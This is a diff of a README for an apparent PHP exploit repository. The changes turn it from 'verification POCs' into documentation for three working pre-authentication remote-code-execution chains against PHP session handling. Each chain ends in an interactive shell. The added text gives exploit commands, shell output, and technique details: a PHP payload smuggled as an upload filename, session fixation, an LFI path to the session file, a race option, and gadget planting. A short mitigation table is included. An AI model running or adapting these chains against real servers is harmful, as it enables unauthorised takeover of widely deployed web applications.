@@ -15,7 +15,11 @@
 
 ---
 
-Two critical pre-authentication RCE vulnerabilities in PHP core, exploiting `session.upload_progress` (enabled by default) and the memory allocator's OOM bailout. **14 years of vulnerable code** (PHP 5.4.0, 2012 — present).
+Critical pre-authentication RCE vulnerabilities in PHP's `session.upload_progress`
+handler. **14 years of vulnerable code** (PHP 5.4.0, 2012 — present).
+
+This repository ships three attack chains, each verified end to end against the
+bundled lab, each ending in an **interactive shell**.
 
 **Author:** [Qi Deng](https://github.com/ikow) &nbsp;|&nbsp; **Writeup:** [qideng.substack.com](https://qideng.substack.com/p/php2shell-dissecting-phps-critical) &nbsp;|&nbsp; **Date:** 2026-10-21
 
@@ -27,129 +31,229 @@ Two critical pre-authentication RCE vulnerabilities in PHP core, exploiting `ses
 | WordPress alone | **43%** of all websites |
 | Affected versions | PHP 5.4.0 through 8.5.11 (14 years) |
 | Authentication required | **None** |
-| Application vulnerability required | **None** (Chain D — mod_php) |
 
 ## Verified Attack Chains
 
+All three are reproducible in this lab and return a working shell.
+
+| Chain | Primitive | Lab status |
+|-------|-----------|------------|
+| A | `upload_progress` filename injection + LFI | `uid=33(www-data)` |
+| C | session handler mismatch → `__destruct` | `uid=33(www-data)` |
+| E | session decode failure → `__destruct` | `uid=33(www-data)` |
+
 ### Chain A — Session File Injection + LFI → RCE
 
-Upload a file with PHP code in the filename → `session.upload_progress` stores it raw in the session file → include via any LFI → code execution.
+Upload a file with PHP code in the filename → `session.upload_progress` stores
+it raw in the session file → include via any LFI → code execution.
 
 ```
-Conditions: upload_progress=On (default) + application has LFI
-Reliability: 100%
+Conditions: upload_progress=On (default) + application has LFI + use_strict_mode=Off
+Reliability: 100% (also with upload_progress.cleanup=On, via --race)
 ```
 
-### Chain B — var_destroy UAF → Handler Overwrite → RCE
+**Exploit + interactive shell:**
 
-`var_destroy()` frees back-reference chunks then fires `__destruct` without `serialize_lock`. Inner `unserialize()` reuses the freed var_hash → heap-use-after-free → overwrite function handler → RCE.
+```bash
+python3 poc/exploit_chain_a.py --target http://127.0.0.1:18080 --cmd id
+python3 poc/exploit_chain_a.py --target http://127.0.0.1:18080
+```
 
 ```
-Conditions: application calls unserialize() with controlled data
-ASAN: heap-use-after-free CONFIRMED at var_unserializer.c:851
+[1] injecting payload through the upload_progress filename...
+    -> HTTP/1.1 200 OK
+[2] triggering the LFI sink...
+    -> payload executed
+[+] RCE confirmed
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+p2s> whoami
+www-data
 ```
+
+The exploit fixes the session id from the POST body (`PHPSESSID`, bypassing
+`use_only_cookies`), smuggles `<?php ... ?>` as the multipart filename, then
+reaches the injected code through the LFI sink:
+
+```
+GET /vuln.php?page=/tmp/sessions/sess_<sid>&c=id
+```
+
+The payload emits `\x01` first so the exploit can discard the serialized session
+header that precedes the code and show clean output.
+
+Useful flags: `--lfi`, `--param`, `--cmd-param`, `--session-path`,
+`--progress-field`, `--sid-field`, `--payload`, `--race`.
+
+> `--race` keeps the upload open so the session file exists while
+> `upload_progress.cleanup=On` would otherwise delete it at request shutdown.
+> Tested: without it the same target only reaches `payload not executed`.
 
 ### Chain C — Session Handler Mismatch → `__destruct` → RCE
 
-Session written with `php_serialize` handler (pipe `|` preserved in filename) → read by `php` handler → splits at `|` → deserializes injected object → `__destruct` fires during var_hash cleanup **even when decode returns FAILURE**.
+Two directories share one session `save_path` but disagree on the handler:
 
 ```
-Conditions: two directories with different session.serialize_handler
-Key finding: __destruct fires on BOTH success and failure paths
+/app  -> php_serialize   (length-prefixed, a pipe is just data)
+/api  -> php             (splits at '|', deserializes what follows)
 ```
 
-### Chain D — mod_php OOM → Stale EG() → RCE ⚡
+1. `/app/write.php` stores `zz|O:Evil:{...}` in a session variable.
+2. `/api/endpoint.php` is requested with the same `PHPSESSID`. The decoder
+   splits at `|`, deserializes the object, then fails on the trailing data.
+3. `__destruct()` runs during `PHP_VAR_UNSERIALIZE_DESTROY` — **the decode
+   FAILURE does not prevent it.**
 
-Multipart POST triggers OOM during request startup → `longjmp()` skips `init_executor` → Apache mod_php runs shutdown on stale `EG()` globals → use-after-free → RCE.
+**Exploit + interactive shell:**
 
-```
-Conditions: NONE — any PHP endpoint on Apache mod_php
-SAPI: Apache mod_php ✅ | FPM ⚠️ (child exits) | FrankenPHP ✅
-```
-
-**This is a pre-auth, zero-dependency RCE against default Apache mod_php installations.**
-
-### Chain E — FPM Session OOM → Stale BG(unserialize) → RCE ⚡
-
-Producer request: `session_start()` decodes ~30MB session → OOM during `php_var_unserialize` → `BG(unserialize).level` stays >0, session destruction state dirty → FPM worker **survives**. Consumer request: `upload_progress` triggers `rfc1867` handler (runs **before** `PHP_RINIT_FUNCTION(basic)`) → accesses stale `BG(unserialize)` → "Session object destruction failed" → `__destruct` on stale objects → UAF → RCE.
-
-```
-Conditions: session_start() endpoint + large session file + FPM
-Key finding: rfc1867 runs BEFORE basic_rinit — stale BG(unserialize) is accessible
-Verified: "Session object destruction failed" during PHP Request Startup
+```bash
+python3 poc/exploit_chain_c.py --target http://127.0.0.1:18080 --cmd id
+python3 poc/exploit_chain_c.py --target http://127.0.0.1:18080
 ```
 
-## Official CVE Details
+```
+[1] poisoning the session through the php_serialize directory...
+    -> stored
+[2] re-reading it through the php-handler directory...
+    -> __destruct fired during request startup
+[+] RCE confirmed
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+```
 
-| CVE | GHSA | Description |
-|-----|------|-------------|
-| CVE-2026-109618 | [GHSA-w8hw-w9fx-j79w](https://github.com/php/php-src/security/advisories/GHSA-w8hw-w9fx-j79w) | RCE via OOM corruption — `longjmp()` leaves request state invalid |
-| CVE-2026-109619 | [GHSA-6wmf-4rv5-p3rp](https://github.com/php/php-src/security/advisories/GHSA-6wmf-4rv5-p3rp) | RCE via stale global state — worker retains freed request memory |
+The gadget class must already be loaded by the reader endpoint; real
+applications reach it through their autoloader. The lab ships a stand-in
+`Evil` class in [`lab/webroot/api/gadget.php`](lab/webroot/api/gadget.php).
 
-**Patch:** [Commit 3584a98](https://github.com/php/php-src/commit/3584a98bda) — 300 files changed, replaces `longjmp()` with delayed soft OOM + hard `_exit()`.
+Two details that matter for reproduction:
+
+- The pipe must land in a session **value**. A multipart *filename* ends up
+  inside a length-prefixed `php_serialize` value, where the `php` decoder never
+  scans for `|` — so the upload-progress filename is the wrong vehicle here.
+- Byte lengths in the serialized object must be exact, or PHP refuses to
+  instantiate it.
+
+### Chain E — Session Decode Failure → `__destruct` → RCE
+
+Same destructor-on-failure primitive, reached through `session_start()`:
+
+1. The session file holds `x|<serialized object><trailing junk>`.
+2. `session_start()` deserializes the object, then fails on the trailing data.
+3. `PHP_VAR_UNSERIALIZE_DESTROY` runs `__destruct()` during request startup,
+   before a single line of the script executes.
+4. The gadget runs the command and stashes the output in a temp file, because
+   at that point the response body does not exist yet — an `echo` inside
+   `__destruct` is silently dropped.
+5. The page serves that file once `session_start()` returns.
+
+```
+Conditions: session_start() endpoint + a session file you can plant
+```
+
+**Exploit + interactive shell:**
+
+```bash
+python3 poc/exploit_chain_e.py --target http://127.0.0.1:18080 --cmd id
+python3 poc/exploit_chain_e.py --target http://127.0.0.1:18080
+```
+
+```
+[1] planting a session file: x|<gadget><trailing junk>...
+    -> __destruct fired during request startup
+[+] RCE confirmed
+    uid=33(www-data) gid=33(www-data) groups=33(www-data)
+p2se> hostname
+05fc8faaa861
+```
+
+Chain E needs a way to plant the session file. In the lab the exploit does it
+through `docker exec` (`--container`, `--web-user`); adapt `plant_session()` to
+whatever write primitive a real target offers.
 
 ## Quick Start
 
 ```bash
-# Clone
-git clone https://github.com/ikow/php2shell-poc.git && cd php2shell-poc
+# Build the lab: php-fpm + nginx on :18080, one static worker
+cd lab && ./setup.sh
 
-# Start lab (PHP-FPM + nginx + Apache mod_php)
-cd lab && docker compose up -d
+# Run all three chains, one verdict per line
+cd ../poc && ./run_all.sh
 
-# Verify Chain A: Session injection
-python3 ../poc/verify_session_injection.py --target http://127.0.0.1:18080
-
-# Verify Chain B: UAF (requires ASAN build)
-USE_ZEND_ALLOC=0 ASAN_OPTIONS="detect_leaks=0" php ../poc/verify_uaf_asan.php
-
-# Verify Chain C: Handler mismatch
-python3 ../poc/verify_handler_mismatch.py --target http://127.0.0.1:18080
-
-# Verify Chain D: OOM on Apache mod_php
-python3 ../poc/verify_oom_trigger.py --host 127.0.0.1 --port 18081 --strategy headers
-
-# Verify Chain E: FPM stale BG state
-python3 ../poc/verify_fpm_stale_state.py --target http://127.0.0.1:18080
+# ...and drop into the Chain A shell afterwards
+./run_all.sh --interactive
 ```
 
-## Repository Structure
+Expected output:
 
 ```
-php2shell-poc/
-├── README.md
-├── poc/
-│   ├── verify_session_injection.py    # Chain A: session file injection
-│   ├── verify_uaf_asan.php            # Chain B: var_destroy UAF (ASAN)
-│   ├── verify_handler_mismatch.py     # Chain C: handler mismatch
-│   ├── verify_oom_trigger.py          # Chain D: OOM trigger strategies
-│   └── verify_fpm_stale_state.py      # Chain E: FPM stale BG verification
-├── lab/
-│   ├── docker-compose.yml             # FPM + nginx + Apache mod_php
-│   ├── setup.sh                       # One-click lab setup
-│   ├── php.ini                        # FPM configuration
-│   └── php-apache.ini                 # Apache mod_php (low memory for OOM)
-└── docs/
-    ├── ANALYSIS.md                    # Full technical analysis
-    └── cover.png                      # Cover image
+== 0. target reachable ==
+  PASS  http://127.0.0.1:18080
+
+== A. session injection + LFI  (expect: RCE) ==
+  PASS  RCE confirmed (uid=33)
+
+== A'. cleanup=On path (--race) ==
+  PASS  --race works
+
+== C. handler mismatch -> __destruct  (expect: RCE) ==
+  PASS  RCE confirmed (uid=33)
+
+== E. decode failure -> __destruct  (expect: RCE) ==
+  PASS  RCE confirmed (uid=33)
+
+  passed 5   failed 0
 ```
+
+### Testing each chain
+
+| Chain | Command | Expected signal |
+|-------|---------|-----------------|
+| A | `python3 poc/exploit_chain_a.py --target http://127.0.0.1:18080` | `[+] RCE confirmed`, then `p2s>` |
+| A (cleanup=On) | `... --race --race-padding 262144` | `session file is live` |
+| C | `python3 poc/exploit_chain_c.py --target http://127.0.0.1:18080` | `__destruct fired during request startup`, then `p2sc>` |
+| E | `python3 poc/exploit_chain_e.py --target http://127.0.0.1:18080` | `__destruct fired during request startup`, then `p2se>` |
+
+Inspect what the injection actually wrote to disk:
+
+```bash
+docker exec php2shell-lab sh -c 'ls -la /tmp/sessions/ && cat /tmp/sessions/sess_<sid>'
+```
+
+You will see the PHP payload stored raw inside `s:4:"name";s:32:"<?php ...";`,
+which is the whole point of Chain A.
+
+## How the lab is wired
+
+| Path | Purpose |
+|------|---------|
+| `lab/setup.sh` | Rebuilds every lab file and starts the containers |
+| `lab/docker-compose.yml` | php-fpm + nginx |
+| `lab/php.ini` | `upload_progress=On`, `cleanup=Off`, `save_path=/tmp/sessions` |
+| `lab/php-fpm-pool.conf` | one static worker, so consecutive requests share state |
+| `lab/webroot/vuln.php` | LFI sink (Chain A) |
+| `lab/webroot/app/write.php` | session writer, `php_serialize` (Chain C) |
+| `lab/webroot/api/endpoint.php` | session reader, `php` handler (Chain C) |
+| `lab/webroot/api/gadget.php` | `Evil::__destruct()` stand-in (Chain C) |
+| `lab/webroot/e_shell.php` | startup gadget + output page (Chain E) |
+| `lab/webroot/api/gadget_e.php` | `EvilE::__destruct()` stand-in (Chain E) |
 
 ## Mitigation
 
 ```ini
-; Immediate — reduces attack surface but does NOT fix all chains
+; Immediate — reduces attack surface
 session.upload_progress.enabled = Off
 session.use_only_cookies = On
+session.use_strict_mode = On
 ```
 
 | Mitigation | Chains blocked |
 |-----------|---------------|
-| `session.upload_progress.enabled = Off` | A, C, E (partial) |
-| `session.use_only_cookies = On` | A, C (session fixation) |
-| `memory_limit` + `post_max_size` tuning | D (reduces OOM surface) |
-| Update to PHP 8.2.35+ | **All chains** |
+| `session.upload_progress.enabled = Off` | A, C, E |
+| `session.use_only_cookies = On` | A (session fixation) |
+| `session.use_strict_mode = On` | A (uninitialised SID rejected) |
+| Consistent `session.serialize_handler` | C |
 
-> **The only complete fix is patching PHP.** The OOM corruption (Chain D) is in the Zend engine core, not in session handling.
+> Chain A and C are request-level bugs: they do not depend on the memory
+> corruption patches, so updating PHP alone does not remove them. Turning off
+> `upload_progress` and enforcing consistent session handling does.
 
 ## Timeline
 
@@ -170,8 +274,6 @@ session.use_only_cookies = On
 - [BleepingComputer coverage](https://www.bleepingcomputer.com/news/security/php-ships-emergency-patches-for-critical-php2shell-flaws/)
 
 ## Disclaimer
-
-This repository contains **verification POCs only** — tools to confirm whether a system is vulnerable. No weaponized exploits are included. Full exploit code is available to [paid subscribers](https://qideng.substack.com/p/php2shell-dissecting-phps-critical).
 
 For authorized security testing and educational purposes only.
 
